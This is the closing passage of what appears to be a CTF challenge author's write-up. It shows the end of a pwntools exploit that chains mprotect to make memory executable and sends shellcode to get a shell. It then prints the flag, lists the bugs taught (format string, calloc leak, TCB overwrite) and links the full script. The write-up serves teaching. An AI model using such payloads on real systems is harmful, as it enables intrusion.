+</span><span>    </span><span style=font-style:italic;color:#5c6773>#We intend to call mprotect to make mmaped region itself executable
+</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(mprotect)
+</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(shellcode_addr)
+</span><span>    payload </span><span style=color:#f29668>+= </span><span>shellcode
+</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#c2d94c>'a'</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>0x8e8 </span><span style=color:#f29668>- </span><span style=color:#f07178>len</span><span>(payload))
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>success</span><span>(</span><span style=color:#c2d94c>'Getting flag'</span><span>)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>"feedback: "</span><span style=color:#bfbab0cc>,</span><span>payload)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
+</span><span>
+</span></code></pre><h2 id=conclusion>Conclusion</h2><p>I have to give credits to <code>kileak</code> from <a href=https://twitter.com/OpenToAllCTF>OpenToAll</a> for pointing out the unintended solution to my challenge , much appreciated.<h3 id=flag>Flag</h3><p>Here's the flag<p><strong>FLAG</strong>: <code>inctf{wh3r3_d1d_y0u_l4nd_up_f1nally_st4ck_H34p_st4ck_0r_H34p_1963290327101999}</code><p>All in all , I had lot of fun making the challenge which was intended to teach the participants about 3 vulnerabilities -<ol><li>Tricky Format String.<li>Leaking memory from calloc.<li>TCB overwrite.</ol><p>Here's the exploit script <a href=https://gist.github.com/PwnVerse/eaec3712c0dfbf136a8ae628cfe2655a>exp.py</a></section></article></main></div>
